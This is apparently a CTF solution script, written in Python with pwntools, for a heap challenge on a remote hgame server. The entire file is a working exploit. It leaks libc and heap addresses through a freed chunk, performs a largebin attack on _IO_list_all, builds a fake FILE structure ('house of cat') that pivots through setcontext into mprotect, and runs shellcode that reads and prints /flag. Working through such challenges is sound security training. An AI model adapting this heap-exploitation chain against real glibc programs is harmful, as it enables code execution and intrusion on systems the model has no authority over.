from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln"])
sh = remote("week-4.hgame.lwsec.cn", 30720)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6")


def add(idx: int, size: int):
    sh.sendlineafter(b'5. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())


def delete(idx: int):
    sh.sendlineafter(b'5. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def edit(idx: int, content: bytes):
    sh.sendlineafter(b'5. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendafter(b'Content: ', content)


def show(idx: int):
    sh.sendlineafter(b'5. Exit', b'4')
    sh.sendlineafter(b'Index: ', str(idx).encode())

def exit_():
    sh.sendlineafter(b'5. Exit', b'5')


# Leak libc addr
add(0, 0x528)  # p1
add(1, 0x500)  # g1
add(2, 0x518)  # p2
add(3, 0x500)  # g2
delete(0)
show(0)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1f6cc0
large_addr = libc_base + 0x1f70f0
_io_list_all_addr = libc_base + 0x1f7660
setcontext_61_addr = libc_base + libc.sym['setcontext'] + 61
_io_wfile_jumps_addr = libc_base + libc.sym['_IO_wfile_jumps']
mprotect_addr = libc_base + libc.sym['mprotect']
print(hex(libc_base))

add(4, 0x538)

# Leak heap addr

edit(0, b'A'*0x10)
show(0)

sh.recvuntil(b'A'*0x10)
heap_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print(hex(heap_addr))


edit(0, p64(large_addr)*2 + p64(heap_addr) + p64(_io_list_all_addr-0x20))
delete(2)
add(5, 0x538)


# house of cat
fake_io_addr = heap_addr + 0xce0 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = p64(0)*3        #_flags=rdi
fake_IO_FILE += p64(1) + p64(0)*2
fake_IO_FILE += p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE += p64(heap_addr + 0x1200)#_IO_backup_base=rdx
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(setcontext_61_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_addr + 0x7d0)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x20)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(_io_wfile_jumps_addr+0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

def convert_str_asmencode(content: str):
    out = ""
    for i in content:
        out = hex(ord(i))[2:] + out
    out = "0x" + out
    return out

shellcode = asm(
f"""
xor rsi,rsi;
xor rdx,rdx;
push rdx;
mov rax,{convert_str_asmencode("/flag")};
push rax;
mov rdi,rsp;
xor rax,rax;
mov al,2;
syscall;
mov rdi,rax;
mov dl,0x40;
mov rsi,rsp
mov rax,0;
syscall;
xor rdi,rdi;
mov rax,1;
syscall;
ret
"""
)
payload = p64(heap_addr + 0x12b0)
payload = payload.ljust(0x68, b'\x00')
payload += p64(heap_addr + 0x1000)
payload += p64(0x1000)
payload += p64(heap_addr + 0x1800)
payload += p64(0)
payload += p64(7)
payload = payload.ljust(0xA0, b'\x00')
payload += p64(heap_addr + 0x1200)
payload += p64(mprotect_addr)
payload += shellcode

edit(3, payload)
edit(2, fake_IO_FILE)
# gdb.attach(sh, f'b *{hex(setcontext_61_addr)}')
# pause(4)

sh.interactive()